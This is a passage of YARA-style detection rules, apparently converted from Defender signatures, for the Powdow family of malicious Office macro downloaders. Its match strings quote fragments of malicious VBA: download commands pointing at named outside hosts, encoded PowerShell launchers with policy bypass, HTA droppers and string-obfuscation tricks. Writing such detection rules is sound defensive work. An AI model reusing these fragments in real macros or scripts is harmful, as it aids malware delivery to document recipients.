        $x_1_2 = "IEhy.ShellExecute \"P\" + fd45cvv0, fgfjhfgfg, \"\", \"\", 0" ascii //weight: 1
        $x_1_3 = "'MsgBox'MsgBox'MsgBox'MsgBox'MsgBox'MsgBox'MsgBox" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_ALT_2147786737_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.ALT!MTB"
        threat_id = "2147786737"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "fhks = \"jLwCjLw:jLw\\jLwWjLwijLwndjLwowjLws\\SjLwysjLwtejLwm3jLw2\\cjLwmjLwd.jLwejLwxjLwe" ascii //weight: 1
        $x_1_2 = "rhqwoelhsld = Replace(jlvfd, bxcj, \"\")" ascii //weight: 1
        $x_1_3 = "fojn = ertjwlkfj(0, \"\", \"\", 0, 0)" ascii //weight: 1
        $x_1_4 = "wer = te + Shell(hkiwe + \" \" + wkjh, 0)" ascii //weight: 1
        $x_1_5 = "MsgBox \"q34" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_ALT_2147786737_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.ALT!MTB"
        threat_id = "2147786737"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= Environ$(\"USERPROFILE\") & \"\\\" &" ascii //weight: 1
        $x_1_2 = "= Chr(50) + Chr(48) + Chr(48)" ascii //weight: 1
        $x_1_3 = {53 65 74 20 57 73 68 53 68 65 6c 6c 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 57 53 63 72 69 70 74 2e 53 68 65 6c 6c 22 29 [0-32] 53 70 65 63 69 61 6c 50 61 74 68 20 3d 20 57 73 68 53 68 65 6c 6c 2e 53 70 65 63 69 61 6c 46 6f 6c 64 65 72 73 28 22 52 65 63 65 6e 74 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = {2e 53 74 61 74 75 73 20 3d 20 32 30 30 20 54 68 65 6e 02 00 53 65 74}  //weight: 1, accuracy: Low
        $x_1_5 = {46 75 6e 63 74 69 6f 6e 20 [0-53] 28 29 20 41 73 20 [0-16] 43 61 6c 6c 20 [0-64] 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_6 = {69 2c 20 31 29 [0-32] 45 6e 64 20 49 66 [0-32] 4e 65 78 74}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_ALB_2147786738_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.ALB!MTB"
        threat_id = "2147786738"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Start-BitsTransfer -Source htt`p://easyviettravel.vn/vendor/seld/0A3/Specifications_Details_202300_RFQ\" & Replace(\".gk4dxe\", \"gk4d\", \"e\")" ascii //weight: 1
        $x_1_2 = "tooabove = \"C:\\Users\\Public\\Documents\\frontcheck.bat\"" ascii //weight: 1
        $x_1_3 = "Print #officialhear" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_ALA_2147786739_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.ALA!MTB"
        threat_id = "2147786739"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "bq \"c:\\programdata\\codeVariableProc.hta\", \"d /c" ascii //weight: 1
        $x_1_2 = "Shell \"cm\" & varProcBr & procProcFunc" ascii //weight: 1
        $x_1_3 = "compareFor = Replace(variableI, \"pmrtp\", \"\")" ascii //weight: 1
        $x_1_4 = "Print #1, compareFor(ActiveDocument.Range.Text)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BRTB_2147787037_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BRTB!MTB"
        threat_id = "2147787037"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Public Function wU4acz8CD(dMimp As String, dMimp2 As String) As String" ascii //weight: 1
        $x_1_2 = "Set uqvTMY5QA = CreateObject(dMimp2)" ascii //weight: 1
        $x_1_3 = "wU4acz8CD = uqvTMY5QA.Replace(nnMhv(0), \"\")" ascii //weight: 1
        $x_1_4 = "wU4acz8CD = wU4acz8CD + Chr(Asc(Mid(nnMhv, Len(nnMhv) - i + 1, 1)) - 2)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_DICE_2147787038_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.DICE!MTB"
        threat_id = "2147787038"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "bq \"c:\\programdata\\toToVariable.hta\", \"d /c \"" ascii //weight: 1
        $x_1_2 = "iFor = Replace(ActiveDocument.Range.Text, variableForHtml, \"\")" ascii //weight: 1
        $x_1_3 = "Shell \"cm\" & iCompsI & codeCodeVar" ascii //weight: 1
        $x_1_4 = "Print #1, iFor(\"xpgod\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BRTC_2147787082_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BRTC!MTB"
        threat_id = "2147787082"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Public Function Ri0GPh(HwTeVD8af As String, HwTeVD8af2 As String) As String" ascii //weight: 1
        $x_1_2 = "Set l0FqzrmzJ = CreateObject(HwTeVD8af2)" ascii //weight: 1
        $x_1_3 = "Ri0GPh = l0FqzrmzJ.Replace(DqqlX(0), \"\")" ascii //weight: 1
        $x_1_4 = "Ri0GPh = Ri0GPh + Chr(Asc(Mid(DqqlX, Len(DqqlX) - i + 1, 1)) - 2)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_DXLM_2147787267_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.DXLM!MTB"
        threat_id = "2147787267"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Call Err.Raise(vbObjectError, \"MyDecode\", \"Input string is not valid Base64.\")" ascii //weight: 1
        $x_1_2 = {73 74 72 73 74 72 20 3d 20 22 63 6d 64 2e 65 78 65 20 2f 63 20 22 22 70 6f 77 65 72 73 68 65 6c 6c 20 2d 45 78 65 63 75 74 69 6f 6e 50 6f 6c 69 63 79 20 42 79 70 61 73 53 20 2d 45 4e 43 20 22 20 2b 20 53 74 72 43 6f 6e 76 28 44 65 63 6f 64 65 36 34 28 [0-4] 5f 53 74 61 74 75 73 5f [0-6] 28 29 29 2c 20 76 62 46 72 6f 6d 55 6e 69 63 6f 64 65 29 20 2b 20 22 22 22 22}  //weight: 1, accuracy: Low
        $x_1_3 = "Set objProcess = GetObject(\"winmgmts:\\\\.\\root\\cimv2:Win32_Process\")" ascii //weight: 1
        $x_1_4 = "objProcess.Create strstr, Null, objConfig, intProcessID" ascii //weight: 1
        $x_1_5 = "Private Const clOneMask = 16515072" ascii //weight: 1
        $x_1_6 = "bIn = StrConv(sString, vbFromUnicode)" ascii //weight: 1
        $x_1_7 = {49 66 20 69 50 61 64 20 54 68 65 6e 20 73 4f 75 74 20 3d 20 4c 65 66 74 24 28 73 4f 75 74 2c 20 4c 65 6e 28 73 4f 75 74 29 20 2d 20 69 50 61 64 29 [0-16] 44 65 63 6f 64 65 36 34 20 3d 20 73 4f 75 74 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVJ_2147787285_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVJ!MTB"
        threat_id = "2147787285"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\"p\" + \"o\" + \"w\" + \"e\" + \"r\" + \"s\" + \"h\" + \"e\" + \"l\" + \"l\" + \".\" + \"e\" + \"x\" + \"e\"" ascii //weight: 1
        $x_1_2 = "+ \"h\" + \"t\" + \"t\" + \"p\" + \"s\" + \":\" + \"/\" + \"/\" + \"w\" + \"ww\" + \".\" + \"bitl\"" ascii //weight: 1
        $x_1_3 = "u7 = \"\" + \"y.com/" ascii //weight: 1
        $x_1_4 = "ii = u5 + u6 + u7 + u8" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_TTBT_2147787314_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.TTBT!MTB"
        threat_id = "2147787314"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Call VBA.Shell(htmlVariableComps & compsVarTo)" ascii //weight: 1
        $x_1_2 = "iq \"c:\\users\\public\\variableProcHtml.hta\", \" c/ dmc\"" ascii //weight: 1
        $x_1_3 = "Print #1, varHtml(\"2imqg\")" ascii //weight: 1
        $x_1_4 = "forProc = Replace(coreHtmlCore, varCoreFor, vbNullString)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVK_2147787468_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVK!MTB"
        threat_id = "2147787468"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "link = \"https://www.bitly.com/ad" ascii //weight: 1
        $x_1_2 = "mill = o + m + l + a + i" ascii //weight: 1
        $x_1_3 = ".ShellExecute MsgBox.mill, MsgBox.link" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_ALL_2147787581_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.ALL!MTB"
        threat_id = "2147787581"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Function gDlkYNHWiKjkntJYodhqWkb46Fdf() As Single" ascii //weight: 1
        $x_1_2 = "Call kbfDIkjHJKN" ascii //weight: 1
        $x_1_3 = "= Environ$(\"USERPROFILE\") & \"\\\" &" ascii //weight: 1
        $x_1_4 = "Range(\"A1\").Value = \"Please wait\"" ascii //weight: 1
        $x_1_5 = "MsgBox \"Please wait\"" ascii //weight: 1
        $x_1_6 = "Set objWshShell = CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_7 = "objWshShell.Popup \"Getting resoucrces to display spreedsheet\", , \"OK\"" ascii //weight: 1
        $x_1_8 = "SpecialPath = objWshShell.SpecialFolders(\"Templates\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_ALS_2147787589_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.ALS!MTB"
        threat_id = "2147787589"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {50 72 69 76 61 74 65 20 53 75 62 20 43 6f 6d 6d 61 6e 64 42 75 74 74 6f 6e 31 5f 43 6c 69 63 6b 28 29 [0-6] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_2 = "Attribute VB_Name = \"Module111\"" ascii //weight: 1
        $x_1_3 = {53 75 62 20 5f 02 00 41 75 74 6f 5f 4f 70 65 6e 20 5f 02 00 28 29}  //weight: 1, accuracy: Low
        $x_1_4 = "Set Outlook = CreateObject(\"Outlook.Application\")" ascii //weight: 1
        $x_1_5 = "Set Microsoft = Outlook.CreateObject(\"Shell.Application\")" ascii //weight: 1
        $x_1_6 = {4d 69 63 72 6f 73 6f 66 74 2e 53 68 65 6c 6c 45 78 65 63 75 74 65 20 68 6f 6c 61 2e 67 6f 6c 61 2e 41 63 63 65 6c 65 72 61 74 6f 72 20 2b 20 68 6f 6c 61 2e 67 6f 6c 61 2e 43 6f 6e 74 72 6f 6c 54 69 70 54 65 78 74 2c 20 68 6f 6c 61 2e 67 6f 6c 61 2e 43 61 70 74 69 6f 6e 02 00 45 6e 64 20 5f 02 00 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_ALV_2147787683_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.ALV!MTB"
        threat_id = "2147787683"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "imageType = \"png\" ' or jpg or bmp" ascii //weight: 1
        $x_1_2 = "CSDCDS = \"dcdv hgfn mjhgmj\"" ascii //weight: 1
        $x_1_3 = "mageName = Left(pptName, InStr(pptName, \".\")) & imageType" ascii //weight: 1
        $x_1_4 = "rykg = ioyukiu(183) & ioyukiu(225) & ioyukiu(216) & ioyukiu(148) & ioyukiu(163) & ioyukiu(183) &" ascii //weight: 1
        $x_1_5 = "= dhdzxqevsrpzgkqzhwrpbrbxmwevvfn.Run(xntowwnxoxygygsltmzeiwhq, rftjs)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BTK_2147788293_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BTK!MTB"
        threat_id = "2147788293"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"C:\\Users\\Public\\Documents\\firstdegree.bat\"" ascii //weight: 1
        $x_1_2 = "treealong & breakmorning & \" -w h Start-BitsTransfer -Source htt" ascii //weight: 1
        $x_1_3 = "Destination C:\\Users\\Public\\Documents\\eatand.e`xe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVL_2147788300_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVL!MTB"
        threat_id = "2147788300"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {53 68 65 6c 6c 45 78 65 63 75 74 65 20 46 46 46 20 5f 0d 0a 2e 20 5f 0d 0a 63 6f 6d 61 62 61 74 2c 20 6b 6f 6d 61 6c 20 5f 0d 0a 2e 20 5f 0d 0a 70 33 70 33 70 33 70}  //weight: 1, accuracy: High
        $x_1_2 = "CreateObject(\"S\" + \"h\" + \"e\" + \"l\" + \"l\" + \".\" + \"A\" + \"p\" + \"p\" + \"l\" + \"i\" + \"c\" + \"a\" + \"t\" + \"i\" + \"o\" + \"n\")" ascii //weight: 1
        $x_1_3 = "\"h\" + \"t\" + \"t\" + \"p\" + \"s\" + \":\" + \"/\" + \"/\" + \"w\" + \"w\" + \"w\" + \".\" + \"b\" + \"i\" + \"t\" + \"l\" + \"y\" + \".\" + \"c\" + \"o\" + \"m\" + \"/\" +" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_ALVS_2147788354_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.ALVS!MTB"
        threat_id = "2147788354"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 75 62 20 61 75 74 6f 6f 70 65 4e 28 29 02 00 6d 69 78 20 22 54 22 2c 20 22 41 22 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_2 = {50 75 62 6c 69 63 20 53 75 62 20 6d 69 78 28 [0-32] 2c 20 [0-32] 29 [0-32] 20 3d 20 22 2e 68 22 20 26 20 [0-32] 20 26 20 [0-32] 4f 70 65 6e 20 [0-32] 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23 31}  //weight: 1, accuracy: Low
        $x_1_3 = {50 72 69 6e 74 20 23 31 2c 20 52 65 70 6c 61 63 65 28 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 43 6f 6e 74 65 6e 74 2c 20 22 [0-8] 22 2c 20 22 22 29 02 00 43 6c 6f 73 65 20 23 31 02 00 77 69 6e 64 6f 77 5f 6f 70 65 6e 20 [0-32] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 4e 65 77 20 49 57 73 68 52 75 6e 74 69 6d 65 4c 69 62 72 61 72 79 2e 57 73 68 53 68 65 6c 6c [0-48] 2e 72 75 6e 20 22 73 63 72 69 70 74 72 75 6e 6e 65 72 20 2d 61 70 70 76 73 63 72 69 70 74 20 22 20 26 20 [0-32] 2c 20 32 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_5 = "Attribute VB_Name = \"wavDateMix\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVM_2147788365_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVM!MTB"
        threat_id = "2147788365"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "nirm3 = \"t\" & \"p://drsc.rw/fzi/zeroo\"" ascii //weight: 1
        $x_1_2 = "nirm3 = \"t\" & \"p://sushiempire.com.au/adm/chidi\"" ascii //weight: 1
        $x_1_3 = "CreateObject(\"Ad\" & \"od\" & \"b.S\" & \"tr\" & \"ea\" & \"m\")" ascii //weight: 1
        $x_1_4 = {78 48 74 74 70 2e 4f 70 65 6e 20 22 47 45 54 22 2c 20 70 6c 70 6c 2c 20 46 61 6c 73 65 0d 0a 78 48 74 74 70 2e 53 65 6e 64}  //weight: 1, accuracy: High
        $x_1_5 = "Shell (praveen6)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVN_2147789134_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVN!MTB"
        threat_id = "2147789134"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Set asd = CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_2 = "asd.Run (AmraDX)" ascii //weight: 1
        $x_1_3 = "AmraDX = \"powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVg\"" ascii //weight: 1
        $x_1_4 = {41 75 74 6f 43 6c 6f 73 65 28 29 0d 0a 20 20 20 20 41 5a 78}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVO_2147789188_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVO!MTB"
        threat_id = "2147789188"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 74 72 52 65 76 65 72 73 65 28 22 [0-20] 2f 6d 6f 63 2e 79 6c 74 69 62 2e 77 77 77 2f 2f 3a 73 70 74 74 68 22 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = "comanno = (VBA.StrReverse(\"athsm\"))" ascii //weight: 1
        $x_1_3 = {56 42 41 20 5f 0d 0a 2e 20 5f 0d 0a 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 53 68 65 6c 6c 2e 41 70 70 6c 69 63 61 74 69 6f 6e 22 29}  //weight: 1, accuracy: High
        $x_1_4 = {53 68 65 6c 6c 45 78 65 63 75 74 65 23 20 62 69 69 6c 6c 69 20 5f 0d 0a 2e 20 5f 0d 0a 63 6f 6d 61 6e 6e 6f 20 5f 0d 0a 2c 20 62 61 62 61 62 61 20 5f}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BKL_2147789468_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BKL!MTB"
        threat_id = "2147789468"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "vls = vls &" ascii //weight: 1
        $x_1_2 = "= Chr(fdsg - 122)" ascii //weight: 1
        $x_1_3 = ".Run(iknrwroprqpsmrgy, ahrzrxiqdlluofuxlmzmikrytjclwtkawi)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PPTM_2147793444_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PPTM!MTB"
        threat_id = "2147793444"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {41 74 74 72 69 62 75 74 65 20 56 42 5f 4e 61 6d 65 20 3d 20 22 [0-32] 22 [0-16] 50 75 62 6c 69 63 20 53 75 62 20 41 75 74 6f 5f 6f 70 65 6e 28 29 [0-6] 2e [0-32] 20 3d 20 [0-18] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_2 = {46 75 6e 63 74 69 6f 6e 20 [0-32] 28 [0-69] 20 41 73 20 53 74 72 69 6e 67 29 [0-32] 20 3d 20 34 31 20 2d 20 34 31 02 00 66 67 64 66 67 20 3d 20 22 67 66 64 66 73 20 62 62 6e 20 68 64 62 6e 63 76 6e 62 20 66 22}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 22 57 53 43 72 69 70 74 2e 73 68 65 6c 6c 22 02 00 53 65 74 20 [0-32] 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-72] 29 [0-32] 20 3d 20 [0-21] 2e 52 75 6e 28 [0-69] 2c 20 [0-64] 29 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_4 = {46 75 6e 63 74 69 6f 6e 20 6e 62 6d 6e 6a 6b 28 62 6e 68 66 67 20 41 73 20 56 61 72 69 61 6e 74 29 02 00 6e 76 63 6e 66 67 20 3d 20 22 68 67 68 66 6a 20 20 68 67 64 20 62 67 66 64 65 74 72 65 74 22 02 00 6e 62 6d 6e 6a 6b 20 3d 20 43 68 72 28 62 6e 68 66 67 20 2d 20 31 32 34 29 02 00 78 62 63 6e 62 76 62 63 76 20 3d 20 22 62 76 78 63 76 20 6e 62 76 62 20 76 62 76 20 62 76 78 63 20 2c 7a 78 76 20 76 76 78 63 73 22 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_5 = {3d 20 6e 62 6d 6e 6a 6b 28 32 32 33 29 20 26 20 6e 62 6d 6e 6a 6b 28 32 30 31 29 20 26 20 6e 62 6d 6e 6a 6b 28 [0-3] 29 20 26 20 6e 62 6d 6e 6a 6b 28 31 35 36 29 20 26 20 6e 62 6d 6e 6a 6b 28 31 37 31 29 20 26 20 6e 62 6d 6e 6a 6b 28 31 39 31 29 20 26 20 6e 62 6d 6e 6a 6b 28 31 35 36 29 20 26 20 6e 62 6d 6e 6a 6b}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVP_2147793649_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVP!MTB"
        threat_id = "2147793649"
